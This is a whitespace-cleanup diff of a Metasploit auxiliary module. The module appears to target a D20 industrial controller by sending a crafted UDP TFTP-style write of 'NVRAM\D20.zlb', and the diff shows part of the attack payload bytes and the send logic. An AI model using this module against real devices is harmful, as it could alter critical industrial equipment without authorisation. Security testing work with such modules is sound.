@@ -34,7 +34,7 @@ class Metasploit3 < Msf::Auxiliary
 				DigitalBond.
 				},
 			'Author'         =>
-				[ 
+				[
 					'K. Reid Wightman <wightman[at]digitalbond.com>', # original module
 					'todb' # Metasploit fixups
 				],
@@ -58,12 +58,12 @@ class Metasploit3 < Msf::Auxiliary
 	def run
 		udp_sock = Rex::Socket::Udp.create(
 			'LocalHost' => datastore['LHOST'] || nil,
-			'PeerHost'  => rhost, 
+			'PeerHost'  => rhost,
 			'PeerPort' => rport,
 			'Context' => {'Msf' => framework, 'MsfExploit' => self}
 		) # No need to rescue, it's a UDP faux-socket
 		udp_sock.sendto(payload, rhost, rport)
-		recv = udp_sock.timed_read(65535, recv_timeout) 
+		recv = udp_sock.timed_read(65535, recv_timeout)
 		if recv and recv.size > 0
 			udp_sock.sendto(payload, rhost, rport)
 		else
@@ -81,7 +81,7 @@ class Metasploit3 < Msf::Auxiliary
 		end
 	end
 
-	def payload 
+	def payload
 		"\x00\x01NVRAM\\D20.zlb\x00netascii" +
 			"\x80\x80\x80\x80\x80\x80\x80\x81\x80\x80\x80\x82\x80\x80\x80\x83" +
 			"\x80\x80\x80\x84\x80\x80\x80\x85\x80\x80\x80\x86\x80\x80\x80\x87\x80\x80\x80\x88" +
@@ -134,7 +134,7 @@ class Metasploit3 < Msf::Auxiliary
 			"\x80\x80\x81\xF0\x80\x80\x81\xF1\x80\x80\x81\xF2\x80\x80\x81\xF3\x80\x80\x81\xF4" +
 			"\x80\x80\x81\xF5\x80\x80\x81\xF6\x80\x80\x81\xF7\x80\x80\x81\xF8\x80\x80\x81\xF9" +
 			"\x80\x80\x81\xFA\x80\x80\x81\xFB\x80\x80\x81\xFC\x80\x80\x81\xFD\x80\x80\x81\xFE" +
-			"\x80\x80\x82\x80\x80\x80\x82\x81" 
+			"\x80\x80\x82\x80\x80\x80\x82\x81"
 	end
 
 end
